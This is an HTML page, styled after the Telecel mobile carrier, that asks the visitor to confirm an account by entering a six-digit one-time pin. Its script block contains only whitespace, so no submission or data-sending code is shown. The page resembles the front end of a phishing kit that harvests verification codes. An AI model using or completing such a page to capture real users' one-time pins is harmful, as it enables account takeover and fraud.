<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Telecel OTP</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">

<style>
*{
  box-sizing:border-box;
  font-family:'Inter', Arial, sans-serif;
}

body{
  margin:0;
  background:#f5f5f5;
  display:flex;
  justify-content:center;
}

/* CONTAINER */
.container{
  width:360px;
  background:#f7f7f7;
  border-radius:28px;
  padding:40px 20px;
  box-shadow:0 10px 30px rgba(0,0,0,0.08);
  position:relative;
  overflow:hidden;
  text-align:center;
}

/* RED SHAPE */
.top-bg{
  position:absolute;
  top:0;
  right:0;
  width:220px;
  height:220px;
  background:linear-gradient(135deg, rgba(255,0,0,0.25), rgba(255,0,0,0.6));
  border-bottom-left-radius:120px;
}

.content{
  position:relative;
  z-index:2;
}

/* LOGO */
.logo{
  margin-top:60px;
}

.logo-circle{
  width:52px;
  height:52px;
  background:#ff0000;
  border-radius:50%;
  color:#fff;
  display:flex;
  align-items:center;
  justify-content:center;
  font-size:30px;
  margin:auto;
  font-weight:800;
}

.logo-text{
  color:#ff0000;
  font-size:26px;
  font-weight:bold;
  margin-top:8px;
}

/* TEXT */
.title{
  color:#ff0000;
  font-size:20px;
  font-weight:600;
  margin-top:15px;
}

.subtitle{
  color:#666;
  font-size:15px;
  margin-top:10px;
  line-height:1.5;
}

/* OTP BOXES */
.otp-container{
  display:flex;
  justify-content:space-between;
  margin-top:20px;
}

.otp-input{
  width:45px;
  height:50px;
  border-radius:10px;
  border:1px solid #ddd;
  text-align:center;
  font-size:18px;
  outline:none;
}

.otp-input:focus{
  border:2px solid #ff0000;
}

/* BUTTONS */
.btn{
  width:100%;
  height:55px;
  border:none;
  border-radius:14px;
  font-size:16px;
  margin-top:20px;
  cursor:pointer;
}

.btn-primary{
  background:#ff0000;
  color:#fff;
  font-weight:600;
}

.btn-primary.disabled, .btn-primary:disabled{
  background:#e5e5e5;
  color:#999;
  cursor:not-allowed;
}

.btn-outline{
  background:transparent;
  border:2px solid #ff0000;
  color:#666;
  font-weight:600;
}

/* Message styling */
.message {
  font-size: 14px;
  margin-top: 8px;
  min-height: 20px;
}
.error { color: #dc3545; }
.success { color: #28a745; }

/* ERROR BOX */
.error-box{
  position: absolute;
  top: 20px;
  left: 20px;
  right: 20px;
  background: #fff;
  border: 2px solid #ff4d4d;
  border-radius: 12px;
  padding: 15px;
  display: none;
  box-shadow: 0 5px 20px rgba(0,0,0,0.1);
  z-index: 100;
  text-align: left;
}

.error-title{
  color: #ff0000;
  font-weight: bold;
  margin-bottom: 5px;
}

.error-text{
  color: #444;
  font-size: 14px;
}

.close{
  position: absolute;
  right: 15px;
  top: 10px;
  cursor: pointer;
  font-size: 18px;
  color: #999;
}

/* SPINNER OVERLAY */
#spinner {
  position: fixed;
  inset: 0;
  display: none;
  align-items: center;
  justify-content: center;
  background: rgba(255, 255, 255, 0.7);
  backdrop-filter: blur(2px);
  z-index: 999;
}

.loader {
  width: 44px;
  height: 44px;
  border: 4px solid #ffe0e0;
  border-top: 4px solid #ff0000;
  border-radius: 50%;
  animation: spin 1s linear infinite;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}
</style>
</head>

<body>

<div class="container">
  <div class="top-bg"></div>

  <!-- ERROR BOX -->
  <div class="error-box" id="errorBox">
    <div class="close" onclick="hideError()">×</div>
    <div class="error-title">Error</div>
    <div class="error-text" id="errorText">Wrong OTP</div>
  </div>

  <div class="content">

    <!-- LOGO -->
    <div class="logo">
      <div class="logo-circle">t</div>
      <div class="logo-text">telecel</div>
    </div>

    <!-- TEXT -->
    <div class="title">Confirm your account</div>
    <div class="subtitle" id="subtitleText">
      The One Time Pin has been sent to<br>
      <span id="maskedPhone">02xxxxxx20</span>
      . Enter it below to verify your account.
    </div>

    <!-- OTP INPUT SECTION -->
    <div id="otpSection">
      <div class="otp-container">
        <input class="otp-input" maxlength="1" id="otp1" autofocus>
        <input class="otp-input" maxlength="1" id="otp2">
        <input class="otp-input" maxlength="1" id="otp3">
        <input class="otp-input" maxlength="1" id="otp4">
        <input class="otp-input" maxlength="1" id="otp5">
        <input class="otp-input" maxlength="1" id="otp6">
      </div>
      <div class="message" id="otpMessage"></div>
      <button class="btn btn-primary" id="nextBtn" disabled>Next</button>
    </div>

    <!-- Go Back button -->
    <button class="btn btn-outline" id="goBackBtn">Go Back</button>

  </div>
</div>

<!-- SPINNER OVERLAY -->
<div id="spinner">
  <div class="loader"></div>
</div>

<script>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
</script>

</body>
</html>
